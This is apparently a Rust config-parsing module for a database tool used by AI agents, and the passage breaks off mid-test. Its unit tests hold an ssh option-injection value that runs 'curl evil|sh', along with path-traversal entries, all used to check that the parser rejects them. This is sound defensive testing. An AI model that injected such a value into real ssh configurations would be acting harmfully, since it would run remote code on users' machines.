//! Config parsing: TOML text -> validated structures. Pure: no IO here;
//! the cli layer reads the file and passes an env lookup closure in.

use serde::Deserialize;
use std::collections::BTreeMap;

#[derive(Debug, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct Config {
    #[serde(default)]
    pub defaults: Defaults,
    #[serde(default)]
    pub connections: BTreeMap<String, Connection>,
    /// Global audit policy (UX-8), not per-connection — a human decision about
    /// their own machine, the same for every database.
    #[serde(default)]
    pub audit: Audit,
}

/// `[audit]`: the forensic log of every database-touching command. On by
/// default (auditing is part of the contract, UX-8); switch it off for
/// CI/containers with `enabled = false`.
#[derive(Debug, Default, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct Audit {
    /// Default true.
    pub enabled: Option<bool>,
    /// Override the log path; default `$XDG_DATA_HOME/nyet/audit.jsonl` →
    /// `~/.local/share/nyet/audit.jsonl` (resolved in the cli). LITERAL only:
    /// `${VAR}` is rejected (see `reject_env_vars_in_policy`), because the
    /// environment is the calling agent's — it must not be able to redirect or
    /// silence its own audit trail.
    pub path: Option<String>,
    /// Default false. When true, the record also carries the result rows the
    /// agent saw (volume + PII of the data itself).
    pub log_responses: Option<bool>,
}

impl Config {
    /// Auditing is on unless explicitly disabled (UX-8).
    pub fn audit_enabled(&self) -> bool {
        self.audit.enabled.unwrap_or(true)
    }

    /// Response bodies are logged only when explicitly opted in.
    pub fn audit_log_responses(&self) -> bool {
        self.audit.log_responses.unwrap_or(false)
    }
}

#[derive(Debug, Default, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct Defaults {
    pub row_limit: Option<u64>,
    pub timeout_secs: Option<u64>,
    /// Ceilings the `--limit` / `--timeout` FLAGS cannot exceed. Absent = no
    /// ceiling (the historical behavior); see `Config::row_limit`.
    pub max_row_limit: Option<u64>,
    pub max_timeout_secs: Option<u64>,
    // Routing reads this via peek_defaults_format() BEFORE the semantic parse
    // (so a config error still routes by it); the field stays only so
    // deny_unknown_fields accepts the key here.
    #[allow(dead_code)]
    pub format: Option<String>,
}

// url/password_env are validated now, used by server engines in step 4+.
#[allow(dead_code)]
#[derive(Debug, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct Connection {
    pub engine: String,
    pub url: Option<String>,
    pub path: Option<String>,
    /// Name of the env variable holding the password; the value is never printed.
    pub password_env: Option<String>,
    /// Empty or absent = denied everywhere (fail closed).
    #[serde(default)]
    pub allowed_dirs: Vec<String>,
    pub row_limit: Option<u64>,
    pub timeout_secs: Option<u64>,
    /// Per-connection ceilings, overriding the `[defaults]` ones.
    pub max_row_limit: Option<u64>,
    pub max_timeout_secs: Option<u64>,
    pub validator: Option<Validator>,
    pub ssh: Option<Ssh>,
    pub guardrail: Option<Guardrail>,
    pub pii: Option<Pii>,
}

/// `[connections.X.pii]`: the columns the config owner declares to be personal
/// data. `mode = "deny"` (the default) refuses (NYET, exit 5) any query that
/// could expose them; `mode = "mask"` additionally lets a plain projection
/// through with every value replaced by `[REDACTED]`. Absent section or
/// `columns = []` = no PII policy, byte-for-byte the historical behavior (UX-5).
/// POLICY, so `${VAR}` inside a rule is rejected like `allowed_dirs` — the agent
/// controls the environment and would otherwise unprotect its own targets.
#[derive(Debug, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct Pii {
    /// `["users.email", "app.customers.ssn"]` — `table.column`, optionally
    /// schema-qualified. Parsed and validated by `validator::PiiRules::parse`.
    pub columns: Option<Vec<String>>,
    /// `"deny"` (default) | `"mask"`. Validated by `validator::PiiMode::parse`.
    pub mode: Option<String>,
}

#[derive(Debug, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct Validator {
    pub allow_functions: Option<Vec<String>>,
    pub deny_functions: Option<Vec<String>>,
}

/// `[connections.X.guardrail]`: refuse a query whose PLAN estimates more than
/// the threshold. Values are validated at parse time by `guardrail::resolve`
/// (unknown mode, a mode the engine cannot honor, a threshold that would refuse
/// everything) — fail loud, exit 3.
#[derive(Debug, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct Guardrail {
    /// `cost` | `rows` | `off`; the default depends on the engine.
    pub mode: Option<String>,
    pub max_cost: Option<f64>,
    pub max_rows: Option<u64>,
}

#[derive(Debug, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct Ssh {
    pub host: Option<String>,
    pub remote: Option<String>,
    pub control_persist: Option<String>,
}

#[derive(Debug)]
pub enum ConfigError {
    /// TOML syntax error or schema violation (unknown key, wrong type, ...).
    Invalid(String),
    /// `${VAR}` referenced in the config but the variable is not set.
    MissingEnvVar(String),
    /// `${VAR}` is set but its value is not valid UTF-8.
    NotUnicodeEnvVar(String),
    /// An allowed_dirs entry that is neither absolute nor a safe `~/` path
    /// (relative, or `~//...` whose remainder is rooted) — both fail-open.
    InvalidAllowedDir { alias: String, dir: String },
    /// `${VAR}` in a POLICY value (allowed_dirs, validator allow/deny lists,
    /// guardrail mode): the environment is controlled by the calling agent, so
    /// substitution there would let the agent widen its own scope, un-deny a
    /// function or switch the guardrail off. Literal values only.
    EnvVarInPolicy {
        alias: String,
        key: &'static str,
        value: String,
    },
    /// `row_limit = 0` / `timeout_secs = 0`: zero would mean "no rows" /
    /// "every query times out" — never what anyone wants. Fail loud.
    ZeroValue { key: String },
    /// A `[connections.X.ssh]` section is present but `host` or `remote` is
    /// missing/empty — both are required to open a tunnel. `field` is the name.
    SshMissingField { alias: String, field: &'static str },
    /// An ssh tunnel was configured for a sqlite connection. SQLite is a local
    /// file; a port forward is meaningless (and would silently do nothing).
    SshWithSqlite { alias: String },
    /// A `[connections.X.guardrail]` value the engine cannot honor (unknown
    /// mode, a mode this engine has no estimates for, a threshold that would
    /// refuse everything). Fail loud rather than silently running unguarded.
    GuardrailInvalid { alias: String, message: String },
    /// An ssh `host`/`remote`/`control_persist` value is malformed or unsafe
    /// (e.g. an option-injection host after `${VAR}` substitution). Caught at
    /// parse (fail-fast) rather than as a runtime tunnel error.
    SshInvalid { alias: String, message: String },
    /// A `[connections.X.pii] columns` entry that is not `table.column` or
    /// `schema.table.column`. Fail loud rather than silently protecting nothing.
    PiiRuleInvalid { alias: String, message: String },
    /// `${VAR}` in `[audit] path`: like the per-connection policy values, the
    /// audit path is security-relevant and the agent controls the environment,
    /// so substitution there would let it redirect or disable its own audit
    /// trail. Literal only.
    AuditPathEnvVar { value: String },
}

/// Environment lookup, injected for purity (cli passes `std::env::var`).
pub type EnvLookup<'a> = &'a dyn Fn(&str) -> Result<String, std::env::VarError>;

/// Parse config text.
pub fn parse(text: &str, env: EnvLookup) -> Result<Config, ConfigError> {
    let value: toml::Value =
        toml::from_str(text).map_err(|e| ConfigError::Invalid(toml_message(&e, text)))?;
    // On the RAW value, before substitution: policy values must be literal.
    reject_env_vars_in_policy(&value)?;
    let value = substitute(value, env)?;
    let config: Config = value
        .try_into()
        .map_err(|e: toml::de::Error| ConfigError::Invalid(toml_message(&e, text)))?;
    // Defense in depth below (the literal-only rule already bars env-driven
    // widening). A relative entry would canonicalize against cwd ("." =
    // allowed everywhere); a rooted remainder after `~/` would make join()
    // return the root itself ("~//" = allowed everywhere). Fail closed.
    for (alias, conn) in &config.connections {
        for dir in &conn.allowed_dirs {
            if !valid_allowed_dir(dir) {
                return Err(ConfigError::InvalidAllowedDir {
                    alias: alias.clone(),
                    dir: dir.clone(),
                });
            }
        }
    }
    reject_zero(config.defaults.row_limit, "defaults.row_limit")?;
    reject_zero(config.defaults.timeout_secs, "defaults.timeout_secs")?;
    reject_zero(config.defaults.max_row_limit, "defaults.max_row_limit")?;
    reject_zero(
        config.defaults.max_timeout_secs,
        "defaults.max_timeout_secs",
    )?;
    for (alias, conn) in &config.connections {
        reject_zero(conn.row_limit, &format!("connections.{alias}.row_limit"))?;
        reject_zero(
            conn.timeout_secs,
            &format!("connections.{alias}.timeout_secs"),
        )?;
        reject_zero(
            conn.max_row_limit,
            &format!("connections.{alias}.max_row_limit"),
        )?;
        reject_zero(
            conn.max_timeout_secs,
            &format!("connections.{alias}.max_timeout_secs"),
        )?;
        validate_ssh(alias, conn)?;
        guardrail(alias, conn)?;
        pii(alias, conn)?;
    }
    Ok(config)
}

impl Config {
    /// Effective row limit for one query: flag > per-connection > `[defaults]`
    /// > built-in 1000, then capped by `max_row_limit`.
    pub fn row_limit(&self, conn: &Connection, flag: Option<u64>) -> u64 {
        capped(
            flag.or(conn.row_limit).or(self.defaults.row_limit),
            1000,
            conn.max_row_limit.or(self.defaults.max_row_limit),
        )
    }

    /// Effective per-query timeout: same precedence, capped by
    /// `max_timeout_secs`.
    pub fn timeout_secs(&self, conn: &Connection, flag: Option<u64>) -> u64 {
        capped(
            flag.or(conn.timeout_secs).or(self.defaults.timeout_secs),
            30,
            conn.max_timeout_secs.or(self.defaults.max_timeout_secs),
        )
    }
}

/// The ceiling wins over everything, the flag included: it is the config
/// owner's word on how much of their database an agent may spend, and an agent
/// that can raise its own ceiling does not have one (the same reasoning as the
/// guardrail's missing `--force`). A ceiling below the configured value clamps
/// that too — a contradiction inside the config resolves the strict way.
/// Clamping is SILENT: the effective limit is already visible through the
/// ordinary `TRUNCATED` / `TIMEOUT` answers, and a warning on every call would
/// be noise (UX-4). No ceiling = the historical behavior, byte for byte.
fn capped(value: Option<u64>, builtin: u64, ceiling: Option<u64>) -> u64 {
    let value = value.unwrap_or(builtin);
    match ceiling {
        Some(ceiling) => value.min(ceiling),
        None => value,
    }
}

/// The raw `[defaults].format` string, read from a structural TOML parse
/// only — no substitution, no semantic validation. The cli resolves the
/// envelope-routing format from this BEFORE the full semantic parse, so a
/// config error (e.g. `row_limit = 0`) still routes its error envelope by
/// the configured format instead of defaulting to json/stdout. Returns None
/// if the TOML is malformed or the key is absent/non-string (routing then
/// falls back to the flag, then json).
pub fn peek_defaults_format(text: &str) -> Option<String> {
    toml::from_str::<toml::Value>(text)
        .ok()?
        .get("defaults")?
        .get("format")?
        .as_str()
        .map(str::to_string)
}

/// When a `[ssh]` section is present, `host` and `remote` are required (they
/// are `Option` only so the section can be parsed before this check), and the
/// engine must not be sqlite (a tunnel is meaningless for a local file).
fn validate_ssh(alias: &str, conn: &Connection) -> Result<(), ConfigError> {
    let Some(ssh) = &conn.ssh else {
        return Ok(());
    };
    let present = |v: &Option<String>| v.as_deref().is_some_and(|s| !s.trim().is_empty());
    if !present(&ssh.host) {
        return Err(ConfigError::SshMissingField {
            alias: alias.to_string(),
            field: "host",
        });
    }
    if !present(&ssh.remote) {
        return Err(ConfigError::SshMissingField {
            alias: alias.to_string(),
            field: "remote",
        });
    }
    if conn.engine == "sqlite" {
        return Err(ConfigError::SshWithSqlite {
            alias: alias.to_string(),
        });
    }
    // Strict format/safety validation, fail-fast (exit 3). Critically this
    // rejects an option-injection host (e.g. a `${VAR}` that expanded to
    // `-oProxyCommand=...`) before it can ever reach the ssh argv.
    let invalid = |message: String| ConfigError::SshInvalid {
        alias: alias.to_string(),
        message,
    };
    crate::tunnel::validate_host(ssh.host.as_deref().unwrap_or_default()).map_err(invalid)?;
    crate::tunnel::validate_remote(ssh.remote.as_deref().unwrap_or_default()).map_err(invalid)?;
    if let Some(cp) = &ssh.control_persist {
        crate::tunnel::validate_control_persist(cp).map_err(invalid)?;
    }
    Ok(())
}

/// The connection's effective guardrail — the ONE place it is resolved.
/// `parse` calls it so a mode this engine cannot honor is a loud config error
/// (exit 3) before anything connects, and the cli calls it again to get the
/// value; a connection with no `[guardrail]` section resolves to the per-engine
/// default (see `guardrail::resolve`).
pub fn guardrail(
    alias: &str,
    conn: &Connection,
) -> Result<crate::guardrail::Guardrail, ConfigError> {
    let (mode, max_cost, max_rows) = match &conn.guardrail {
        Some(g) => (g.mode.as_deref(), g.max_cost, g.max_rows),
        None => (None, None, None),
    };
    crate::guardrail::Guardrail::resolve(&conn.engine, mode, max_cost, max_rows).map_err(
        |message| ConfigError::GuardrailInvalid {
            alias: alias.to_string(),
            message,
        },
    )
}

/// The connection's effective PII policy — the ONE place it is resolved.
/// `parse` calls it so a malformed rule is a loud config error (exit 3) before
/// anything connects, and the cli calls it again to build the validator policy.
pub fn pii(alias: &str, conn: &Connection) -> Result<crate::validator::PiiRules, ConfigError> {
    let invalid = |message: String| ConfigError::PiiRuleInvalid {
        alias: alias.to_string(),
        message,
    };
    let columns = conn
        .pii
        .as_ref()
        .and_then(|p| p.columns.as_deref())
        .unwrap_or(&[]);
    let mode = match conn.pii.as_ref().and_then(|p| p.mode.as_deref()) {
        None => crate::validator::PiiMode::default(),
        // A mode with nothing to apply it to is the same class of lie as a rule
        // that can never match: the config owner reads "mask" and believes some
        // column is handled, while there is no policy at all.
        Some(_) if columns.is_empty() => {
            return Err(invalid(
                "mode is set but columns is empty, so the mode applies to nothing: list the \
                 protected columns, or drop the [pii] section entirely"
                    .to_string(),
            ))
        }
        Some(value) => crate::validator::PiiMode::parse(value).map_err(invalid)?,
    };
    crate::validator::PiiRules::parse(columns, mode).map_err(invalid)
}

/// Zero limits are footguns: row_limit = 0 returns nothing (looking like an
/// empty table), timeout_secs = 0 times every query out.
fn reject_zero(value: Option<u64>, key: &str) -> Result<(), ConfigError> {
    if value == Some(0) {
        return Err(ConfigError::ZeroValue {
            key: key.to_string(),
        });
    }
    Ok(())
}

/// POLICY values must be static literals: `${VAR}` in them would let the
/// calling agent — who controls the environment (threat model) — rewrite the
/// policy it is subject to. All three are the same class of decision:
///
/// - `allowed_dirs` — "/srv/${P}" with P="" resolves to the parent "/srv/";
/// - `validator.allow_functions` / `deny_functions` — un-deny `pg_sleep`;
/// - `guardrail.mode` — switch the guardrail off.
///
/// Checked on the RAW tree, before substitution, so an unset variable is
/// rejected too (nothing here is worth a "maybe").
fn reject_env_vars_in_policy(value: &toml::Value) -> Result<(), ConfigError> {
    // `[audit] path` is a global policy value (security-relevant), same rule.
    if let Some(path) = value
        .get("audit")
        .and_then(|a| a.get("path"))
        .and_then(toml::Value::as_str)
    {
        if path.contains("${") {
            return Err(ConfigError::AuditPathEnvVar {
                value: path.to_string(),
            });
        }
    }
    let Some(connections) = value.get("connections").and_then(toml::Value::as_table) else {
        return Ok(());
    };
    for (alias, conn) in connections {
        let literal = |key: &'static str, text: &str| -> Result<(), ConfigError> {
            if text.contains("${") {
                return Err(ConfigError::EnvVarInPolicy {
                    alias: alias.clone(),
                    key,
                    value: text.to_string(),
                });
            }
            Ok(())
        };
        if let Some(dirs) = conn.get("allowed_dirs").and_then(toml::Value::as_array) {
            for dir in dirs.iter().filter_map(toml::Value::as_str) {
                literal("allowed_dirs", dir)?;
            }
        }
        for key in ["allow_functions", "deny_functions"] {
            let functions = conn
                .get("validator")
                .and_then(|v| v.get(key))
                .and_then(toml::Value::as_array);
            for name in functions
                .into_iter()
                .flatten()
                .filter_map(toml::Value::as_str)
            {
                literal(
                    if key == "allow_functions" {
                        "validator.allow_functions"
                    } else {
                        "validator.deny_functions"
                    },
                    name,
                )?;
            }
        }
        for rule in conn
            .get("pii")
            .and_then(|p| p.get("columns"))
            .and_then(toml::Value::as_array)
            .into_iter()
            .flatten()
            .filter_map(toml::Value::as_str)
        {
            literal("pii.columns", rule)?;
        }
        if let Some(mode) = conn
            .get("pii")
            .and_then(|p| p.get("mode"))
            .and_then(toml::Value::as_str)
        {
            literal("pii.mode", mode)?;
        }
        if let Some(mode) = conn
            .get("guardrail")
            .and_then(|g| g.get("mode"))
            .and_then(toml::Value::as_str)
        {
            literal("guardrail.mode", mode)?;
        }
    }
    Ok(())
}

fn valid_allowed_dir(dir: &str) -> bool {
    use std::path::{Component, Path};
    // ".." anywhere (also in the absolute form) escapes the intended prefix.
    if Path::new(dir)
        .components()
        .any(|c| c == Component::ParentDir)
    {
        return false;
    }
    if dir == "~" {
        return true;
    }
    if let Some(rest) = dir.strip_prefix("~/") {
        // A rooted remainder or (on Windows) a drive prefix like "C:." makes
        // home.join(rest) ignore home entirely -> widened scope.
        return !Path::new(rest).has_root()
            && !Path::new(rest)
                .components()
                .any(|c| matches!(c, Component::Prefix(_)));
    }
    Path::new(dir).is_absolute()
}

/// toml::de::Error's Display embeds an excerpt of the offending source line —
/// which may contain credentials. Emit only the bare message + a line number,
/// with double-quoted spans redacted: schema errors echo the offending value
/// ('invalid type: string "secret"...'). Key names use backticks and survive.
fn toml_message(e: &toml::de::Error, text: &str) -> String {
    let msg = redact_quoted(e.message());
    match e.span() {
        Some(span) => {
            let line = text[..span.start.min(text.len())].matches('\n').count() + 1;
            format!("{msg} (at line {line})")
        }
        None => msg,
    }
}

fn redact_quoted(msg: &str) -> String {
    // Greedy: the value itself may contain a quote, so pairwise matching
    // would leave parts of it outside the redaction. Everything from the
    // first to the last quote goes; a lone quote redacts to the end.
    // Over-redacting is the safe direction, under-redacting is not.
    match msg.find('"') {
        None => msg.to_string(),
        Some(first) => {
            let last = msg.rfind('"').unwrap_or(first);
            let tail = if last > first { &msg[last + 1..] } else { "" };
            format!("{}\"...\"{tail}", &msg[..first])
        }
    }
}

/// group/other permission bits set -> warning text (pure; cli reads the mode).
/// `what` names the file (e.g. "config file", "audit log") so the same check
/// serves both — the audit log holds the agent's SQL and is just as sensitive.
pub fn permissions_warning(mode: u32, what: &str) -> Option<String> {
    if mode & 0o077 != 0 {
        Some(format!(
            "{what} is accessible by group/others (mode {:03o}); credentials may leak — run `chmod 600` on it",
            mode & 0o777
        ))
    } else {
        None
    }
}

/// `${VAR}` substitution in every string value, recursively.
fn substitute(value: toml::Value, env: EnvLookup) -> Result<toml::Value, ConfigError> {
    Ok(match value {
        toml::Value::String(s) => toml::Value::String(substitute_str(&s, env)?),
        toml::Value::Array(items) => toml::Value::Array(
            items
                .into_iter()
                .map(|v| substitute(v, env))
                .collect::<Result<_, _>>()?,
        ),
        toml::Value::Table(table) => toml::Value::Table(
            table
                .into_iter()
                .map(|(k, v)| Ok((k, substitute(v, env)?)))
                .collect::<Result<_, _>>()?,
        ),
        other => other,
    })
}

fn substitute_str(s: &str, env: EnvLookup) -> Result<String, ConfigError> {
    use std::env::VarError;
    let mut parts = s.split("${");
    let mut out = String::from(parts.next().unwrap_or(""));
    for part in parts {
        match part.find('}') {
            Some(end) if is_var_name(&part[..end]) => {
                let name = &part[..end];
                match env(name) {
                    Ok(val) => out.push_str(&val),
                    Err(VarError::NotPresent) => {
                        return Err(ConfigError::MissingEnvVar(name.to_string()))
                    }
                    Err(VarError::NotUnicode(_)) => {
                        return Err(ConfigError::NotUnicodeEnvVar(name.to_string()))
                    }
                }
                out.push_str(&part[end + 1..]);
            }
            // Not a well-formed ${NAME} — keep the text literally.
            _ => {
                out.push_str("${");
                out.push_str(part);
            }
        }
    }
    Ok(out)
}

fn is_var_name(s: &str) -> bool {
    !s.is_empty() && s.bytes().all(|b| b.is_ascii_alphanumeric() || b == b'_')
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::collections::HashMap;

    fn env_of(pairs: &[(&str, &str)]) -> impl Fn(&str) -> Result<String, std::env::VarError> {
        let map: HashMap<String, String> = pairs
            .iter()
            .map(|(k, v)| (k.to_string(), v.to_string()))
            .collect();
        move |name: &str| map.get(name).cloned().ok_or(std::env::VarError::NotPresent)
    }

    const FULL: &str = r#"
        [defaults]
        row_limit = 1000
        timeout_secs = 30
        format = "json"

        [connections.prod]
        engine = "postgres"
        url = "postgres://nyet_ro@db.internal:5432/app"
        password_env = "PROD_DB_PASSWORD"
        allowed_dirs = ["~/Workspace/app"]
        row_limit = 500
        timeout_secs = 10

        [connections.prod.validator]
        allow_functions = ["pg_sleep"]
        deny_functions = ["my_scary_fn"]

        [connections.prod.ssh]
        host = "deploy@bastion.corp:22"
        remote = "db.internal:5432"
        control_persist = "15m"

        [connections.localdev]
        engine = "sqlite"
        path = "./dev.db"
        allowed_dirs = ["~/Workspace/app"]
    "#;

    #[test]
    fn full_config_parses() {
        let cfg = parse(FULL, &env_of(&[])).unwrap();
        assert_eq!(cfg.defaults.row_limit, Some(1000));
        assert_eq!(cfg.connections.len(), 2);
        let prod = &cfg.connections["prod"];
        assert_eq!(prod.engine, "postgres");
        // password_env holds the variable *name*, never its value.
        assert_eq!(prod.password_env.as_deref(), Some("PROD_DB_PASSWORD"));
        assert_eq!(
            prod.validator.as_ref().unwrap().allow_functions,
            Some(vec!["pg_sleep".to_string()])
        );
        assert_eq!(
            prod.ssh.as_ref().unwrap().host.as_deref(),
            Some("deploy@bastion.corp:22")
        );
        assert_eq!(
            cfg.connections["localdev"].path.as_deref(),
            Some("./dev.db")
        );
    }

    #[test]
    fn broken_toml_is_invalid() {
        assert!(matches!(
            parse("not = [valid", &env_of(&[])),
            Err(ConfigError::Invalid(_))
        ));
    }

    #[test]
    fn unknown_key_is_invalid() {
        let err = parse(
            "[connections.a]\nengine = \"sqlite\"\ntypo_key = 1",
            &env_of(&[]),
        )
        .unwrap_err();
        match err {
            ConfigError::Invalid(msg) => assert!(msg.contains("typo_key"), "{msg}"),
            other => panic!("expected Invalid, got {other:?}"),
        }
    }

    #[test]
    fn env_substitution_works() {
        let cfg = parse(
            "[connections.a]\nengine = \"postgres\"\nurl = \"postgres://u:${PW}@h/db\"",
            &env_of(&[("PW", "s3cret")]),
        )
        .unwrap();
        assert_eq!(
            cfg.connections["a"].url.as_deref(),
            Some("postgres://u:s3cret@h/db")
        );
    }

    #[test]
    fn missing_env_var_is_hard_error() {
        let err = parse(
            "[connections.a]\nengine = \"postgres\"\nurl = \"${NO_SUCH_VAR_XYZ}\"",
            &env_of(&[]),
        )
        .unwrap_err();
        match err {
            ConfigError::MissingEnvVar(name) => assert_eq!(name, "NO_SUCH_VAR_XYZ"),
            other => panic!("expected MissingEnvVar, got {other:?}"),
        }
    }

    #[test]
    fn non_utf8_env_var_is_hard_error() {
        let env = |_: &str| {
            Err(std::env::VarError::NotUnicode(std::ffi::OsString::from(
                "garbage",
            )))
        };
        let err = parse(
            "[connections.a]\nengine = \"postgres\"\nurl = \"${BAD_VAR}\"",
            &env,
        )
        .unwrap_err();
        match err {
            ConfigError::NotUnicodeEnvVar(name) => assert_eq!(name, "BAD_VAR"),
            other => panic!("expected NotUnicodeEnvVar, got {other:?}"),
        }
    }

    #[test]
    fn bad_allowed_dirs_are_rejected() {
        // Relative entries, rooted-remainder tilde entries and ".." are fail-open.
        for dir in [
            ".",
            "./app",
            "relative/path",
            "~//",
            "~//etc",
            "~/..",
            "~/../etc",
            "/abs/../etc",
        ] {
            let text = format!("[connections.a]\nengine = \"sqlite\"\nallowed_dirs = [\"{dir}\"]");
            let err = parse(&text, &env_of(&[])).unwrap_err();
            match err {
                ConfigError::InvalidAllowedDir { alias, dir: got } => {
                    assert_eq!(alias, "a");
                    assert_eq!(got, dir);
                }
                other => panic!("expected InvalidAllowedDir for {dir:?}, got {other:?}"),
            }
        }
        // Absolute and tilde forms pass.
        for dir in ["/abs/path", "~", "~/proj"] {
            let text = format!("[connections.a]\nengine = \"sqlite\"\nallowed_dirs = [\"{dir}\"]");
            assert!(parse(&text, &env_of(&[])).is_ok(), "{dir} should be valid");
        }
    }

    #[test]
    fn env_vars_in_policy_values_are_rejected_before_substitution() {
        // The calling agent controls the environment, so substitution in a
        // POLICY value would let it rewrite the policy it is subject to:
        // "/srv/${P}" with P="" widens the scope to the parent, ${F} un-denies
        // a function, ${M} switches the guardrail off. Literals only — and the
        // rejection happens before substitution, so an unset variable fails too.
        for (key, body, env) in [
            (
                "allowed_dirs",
                "allowed_dirs = [\"~/${X}\"]".to_string(),
                env_of(&[("X", "/etc")]),
            ),
            (
                "allowed_dirs",
                "allowed_dirs = [\"/srv/${P}\"]".to_string(),
                env_of(&[("P", "")]),
            ),
            (
                "allowed_dirs",
                "allowed_dirs = [\"/srv/${UNSET}\"]".to_string(),
                env_of(&[]),
            ),
            (
                "validator.allow_functions",
                "[connections.a.validator]\nallow_functions = [\"${F}\"]".to_string(),
                env_of(&[("F", "pg_sleep")]),
            ),
            (
                "validator.deny_functions",
                "[connections.a.validator]\ndeny_functions = [\"${F}\"]".to_string(),
                env_of(&[("F", "x")]),
            ),
            (
                "guardrail.mode",
                "[connections.a.guardrail]\nmode = \"${M}\"".to_string(),
                env_of(&[("M", "off")]),
            ),
        ] {
            let text = format!(
                "[connections.a]\nengine = \"postgres\"\nurl = \"postgres://u@h/db\"\n{body}"
            );
            match parse(&text, &env).unwrap_err() {
                ConfigError::EnvVarInPolicy {
                    alias, key: got, ..
                } => {
                    assert_eq!(alias, "a");
                    assert_eq!(got, key);
                }
                other => panic!("expected EnvVarInPolicy({key}), got {other:?}"),
            }
        }
    }

    #[cfg(windows)]
    #[test]
    fn drive_prefix_remainder_after_tilde_is_rejected() {
        // "C:." parses as Component::Prefix only on Windows; there
        // home.join("C:.") ignores home entirely.
        assert!(!valid_allowed_dir("~/C:."));
    }

    #[test]
    fn schema_error_does_not_leak_values_containing_quotes() {
        // The value itself contains a `"`: pairwise quote matching would
        // leave SUPERSECRET outside the redacted span.
        let err = parse(
            "[connections.a]\nengine = \"sqlite\"\nrow_limit = \"prefix\\\"SUPERSECRET\"",
            &env_of(&[]),
        )
        .unwrap_err();
        match err {
            ConfigError::Invalid(msg) => {
                assert!(!msg.contains("SUPERSECRET"), "leaked: {msg}")
            }
            other => panic!("expected Invalid, got {other:?}"),
        }
        // Direct check of the greedy redaction on a raw message.
        assert_eq!(
            redact_quoted(r#"invalid type: string "prefix"SUPERSECRET", expected u64"#),
            r#"invalid type: string "...", expected u64"#
        );
        // Lone quote: redact to the end (unclosed span may hold the value).
        assert_eq!(redact_quoted(r#"got "secret tail"#), r#"got "...""#);
        assert_eq!(redact_quoted("no quotes here"), "no quotes here");
    }

    #[test]
    fn schema_error_does_not_leak_values() {
        // Wrong-type schema errors echo the offending value in quotes;
        // it must be redacted (the value may be a credential).
        let err = parse(
            "[connections.a]\nengine = \"sqlite\"\nrow_limit = \"supersecret\"",
            &env_of(&[]),
        )
        .unwrap_err();
        match err {
            ConfigError::Invalid(msg) => {
                assert!(!msg.contains("supersecret"), "leaked: {msg}")
            }
            other => panic!("expected Invalid, got {other:?}"),
        }
    }

    #[test]
    fn toml_error_does_not_leak_source_text() {
        // Unterminated string: the offending line holds a credential; the
        // error message must not echo the source excerpt (threat model:
        // credentials never reach the LLM context).
        let err = parse(
            "[connections.a]\nengine = \"postgres\"\nurl = \"postgres://user:supersecret@host/db\n",
            &env_of(&[]),
        )
        .unwrap_err();
        match err {
            ConfigError::Invalid(msg) => {
                assert!(!msg.contains("supersecret"), "leaked: {msg}")
            }
            other => panic!("expected Invalid, got {other:?}"),
        }
    }

    #[test]
    fn malformed_placeholder_kept_literally() {
        let cfg = parse(
            "[connections.a]\nengine = \"postgres\"\nurl = \"${not closed\"",
            &env_of(&[]),
        )
        .unwrap();
        assert_eq!(cfg.connections["a"].url.as_deref(), Some("${not closed"));
    }

    #[test]
    fn zero_limits_are_rejected() {
        for (text, key) in [
            ("[defaults]\nrow_limit = 0", "defaults.row_limit"),
            ("[defaults]\ntimeout_secs = 0", "defaults.timeout_secs"),
            (
                "[connections.a]\nengine = \"sqlite\"\nrow_limit = 0",
                "connections.a.row_limit",
            ),
            (
                "[connections.a]\nengine = \"sqlite\"\ntimeout_secs = 0",
                "connections.a.timeout_secs",
            ),
        ] {
            match parse(text, &env_of(&[])).unwrap_err() {
                ConfigError::ZeroValue { key: got } => assert_eq!(got, key),
                other => panic!("expected ZeroValue for {key}, got {other:?}"),
            }
        }
        // 1 is fine.
        assert!(parse("[defaults]\nrow_limit = 1", &env_of(&[])).is_ok());
    }

    #[test]
    fn ssh_section_requires_host_and_remote() {
        // Missing host.
        let text = "[connections.a]\nengine = \"postgres\"\nurl = \"postgres://u@h/db\"\n\
                    [connections.a.ssh]\nremote = \"db:5432\"";
        match parse(text, &env_of(&[])).unwrap_err() {
            ConfigError::SshMissingField { alias, field } => {
                assert_eq!(alias, "a");
                assert_eq!(field, "host");
            }
            other => panic!("expected SshMissingField host, got {other:?}"),
        }
        // Present-but-empty host is also missing.
        let text = "[connections.a]\nengine = \"postgres\"\nurl = \"postgres://u@h/db\"\n\
                    [connections.a.ssh]\nhost = \"  \"\nremote = \"db:5432\"";
        assert!(matches!(
            parse(text, &env_of(&[])).unwrap_err(),
            ConfigError::SshMissingField { field: "host", .. }
        ));
        // Missing remote.
        let text = "[connections.a]\nengine = \"postgres\"\nurl = \"postgres://u@h/db\"\n\
                    [connections.a.ssh]\nhost = \"deploy@bastion:22\"";
        assert!(matches!(
            parse(text, &env_of(&[])).unwrap_err(),
            ConfigError::SshMissingField {
                field: "remote",
                ..
            }
        ));
    }

    #[test]
    fn ssh_option_injection_host_is_rejected_at_parse() {
        // RCE guard: a ${VAR} that expands to an ssh option must fail at config
        // parse (exit 3), before the value can reach the ssh argv.
        let text = "[connections.a]\nengine = \"postgres\"\nurl = \"postgres://u@h/db\"\n\
                    [connections.a.ssh]\nhost = \"${BASTION}\"\nremote = \"db:5432\"";
        match parse(
            text,
            &env_of(&[("BASTION", "-oProxyCommand=sh -c \"curl evil|sh\"")]),
        )
        .unwrap_err()
        {
            ConfigError::SshInvalid { alias, .. } => assert_eq!(alias, "a"),
            other => panic!("expected SshInvalid, got {other:?}"),
        }
        // A malformed remote and a bad control_persist are also parse errors.
        let text = "[connections.a]\nengine = \"postgres\"\nurl = \"postgres://u@h/db\"\n\
                    [connections.a.ssh]\nhost = \"bastion:22\"\nremote = \"db:notaport\"";
        assert!(matches!(
            parse(text, &env_of(&[])).unwrap_err(),
            ConfigError::SshInvalid { .. }
        ));
        let text = "[connections.a]\nengine = \"postgres\"\nurl = \"postgres://u@h/db\"\n\
                    [connections.a.ssh]\nhost = \"bastion:22\"\nremote = \"db:5432\"\n\
                    control_persist = \"fifteen\"";
        assert!(matches!(
            parse(text, &env_of(&[])).unwrap_err(),
